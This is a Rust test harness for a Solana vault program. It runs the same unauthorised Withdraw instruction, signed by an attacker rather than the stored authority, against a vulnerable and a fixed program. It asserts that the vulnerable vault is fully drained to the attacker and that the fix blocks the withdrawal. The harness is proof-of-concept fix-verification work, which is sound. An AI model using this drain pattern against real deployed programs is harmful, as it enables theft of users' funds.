//! Differential PoC harness (binary_differential_oracle spirit):
//! the SAME attacker `Withdraw` instruction is run against the VULNERABLE and
//! the FIXED program in one in-process BanksClient. Treatment must drain the
//! vault; the negative control must fail with the SPECIFIC expected error.
//!
//! Oracle contract: treatment_successes >= 1 AND control_successes == 0, with
//! control failing on exactly ProgramError::Custom(ERR_INCORRECT_AUTHORITY).

use cachorro_vault_spike::{fixed, vulnerable, ERR_INCORRECT_AUTHORITY};
use solana_program_test::{processor, BanksClientError, ProgramTest, ProgramTestBanksClientExt};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction, InstructionError},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::{Transaction, TransactionError},
};

const VAULT_LAMPORTS: u64 = 5_000_000_000; // 5 SOL locked in the vault
const DRAIN: u64 = 5_000_000_000;

fn withdraw_ix(program: Pubkey, vault: Pubkey, dest: Pubkey, authority: Pubkey) -> Instruction {
    let mut data = vec![1u8]; // tag = Withdraw
    data.extend_from_slice(&DRAIN.to_le_bytes());
    Instruction {
        program_id: program,
        accounts: vec![
            AccountMeta::new(vault, false),
            AccountMeta::new(dest, false),
            AccountMeta::new_readonly(authority, true), // attacker signs as SELF
        ],
        data,
    }
}

/// A vault account owned by `owner`, storing `real_authority` in its first 32
/// data bytes, holding VAULT_LAMPORTS.
fn vault_account(owner: Pubkey, real_authority: Pubkey) -> Account {
    let mut data = vec![0u8; 32];
    data.copy_from_slice(real_authority.as_ref());
    Account { lamports: VAULT_LAMPORTS, data, owner, executable: false, rent_epoch: 0 }
}

#[tokio::test]
async fn differential_drain_vs_blocked() {
    let vuln_id = Pubkey::new_unique();
    let fixed_id = Pubkey::new_unique();
    let victim = Pubkey::new_unique(); // the REAL authority stored in both vaults
    let attacker = Keypair::new(); // the caller — NOT the victim
    let vault_vuln = Pubkey::new_unique();
    let vault_fixed = Pubkey::new_unique();
    let dest_vuln = Pubkey::new_unique();
    let dest_fixed = Pubkey::new_unique();

    let mut pt = ProgramTest::default();
    pt.add_program("vuln", vuln_id, processor!(vulnerable::process_instruction));
    pt.add_program("fixed", fixed_id, processor!(fixed::process_instruction));
    pt.add_account(vault_vuln, vault_account(vuln_id, victim));
    pt.add_account(vault_fixed, vault_account(fixed_id, victim));
    pt.add_account(dest_vuln, Account { lamports: 0, data: vec![], owner: solana_sdk::system_program::id(), executable: false, rent_epoch: 0 });
    pt.add_account(dest_fixed, Account { lamports: 0, data: vec![], owner: solana_sdk::system_program::id(), executable: false, rent_epoch: 0 });
    // Fund the attacker so it can pay fees + sign.
    pt.add_account(attacker.pubkey(), Account { lamports: 1_000_000_000, data: vec![], owner: solana_sdk::system_program::id(), executable: false, rent_epoch: 0 });

    let (mut banks, _payer, recent_blockhash) = pt.start().await;

    // ---- TREATMENT: vulnerable program ----
    let vault_before = banks.get_balance(vault_vuln).await.unwrap();
    let dest_before = banks.get_balance(dest_vuln).await.unwrap();
    let tx = Transaction::new_signed_with_payer(
        &[withdraw_ix(vuln_id, vault_vuln, dest_vuln, attacker.pubkey())],
        Some(&attacker.pubkey()),
        &[&attacker],
        recent_blockhash,
    );
    let treatment = banks.process_transaction(tx).await;
    let vault_after = banks.get_balance(vault_vuln).await.unwrap();
    let dest_after = banks.get_balance(dest_vuln).await.unwrap();
    let treatment_ok = treatment.is_ok();

    println!("[TREATMENT vulnerable] result={:?}", treatment);
    println!("[TREATMENT vulnerable] vault lamports {} -> {}", vault_before, vault_after);
    println!("[TREATMENT vulnerable] attacker dest lamports {} -> {} (delta +{})", dest_before, dest_after, dest_after - dest_before);

    // ---- CONTROL: fixed program, SAME attacker instruction ----
    let cvault_before = banks.get_balance(vault_fixed).await.unwrap();
    let recent_blockhash2 = banks.get_new_latest_blockhash(&recent_blockhash).await.unwrap();
    let tx2 = Transaction::new_signed_with_payer(
        &[withdraw_ix(fixed_id, vault_fixed, dest_fixed, attacker.pubkey())],
        Some(&attacker.pubkey()),
        &[&attacker],
        recent_blockhash2,
    );
    let control = banks.process_transaction(tx2).await;
    let cvault_after = banks.get_balance(vault_fixed).await.unwrap();
    let cdest_after = banks.get_balance(dest_fixed).await.unwrap();

    let expected_err = TransactionError::InstructionError(
        0,
        InstructionError::Custom(ERR_INCORRECT_AUTHORITY),
    );
    let control_blocked_specific = matches!(
        &control,
        Err(BanksClientError::TransactionError(e)) if *e == expected_err
    );

    println!("[CONTROL fixed] result={:?}", control);
    println!("[CONTROL fixed] vault lamports {} -> {} (unchanged={})", cvault_before, cvault_after, cvault_before == cvault_after);
    println!("[CONTROL fixed] attacker dest lamports -> {}", cdest_after);
    println!("[CONTROL fixed] expected error = {:?}", expected_err);

    // ---- ORACLE ----
    let treatment_successes = if treatment_ok && vault_after == 0 && dest_after - dest_before == DRAIN { 1 } else { 0 };
    let control_successes = if control.is_ok() { 1 } else { 0 };
    println!("[ORACLE] treatment_successes={} control_successes={} control_blocked_with_expected_error={}",
        treatment_successes, control_successes, control_blocked_specific);
    let verdict = treatment_successes >= 1 && control_successes == 0 && control_blocked_specific
        && cvault_before == cvault_after;
    println!("[ORACLE] VERDICT proven={}", verdict);

    assert!(treatment_ok, "treatment: vulnerable withdraw should succeed");
    assert_eq!(vault_after, 0, "treatment: vault must be fully drained");
    assert_eq!(dest_after - dest_before, DRAIN, "treatment: attacker must receive the drained lamports");
    assert!(control_blocked_specific, "control: fixed program must fail with Custom(ERR_INCORRECT_AUTHORITY), got {:?}", control);
    assert_eq!(cvault_before, cvault_after, "control: fixed vault balance must be unchanged");
    assert!(verdict, "differential oracle: treatment>=1 && control==0");
}
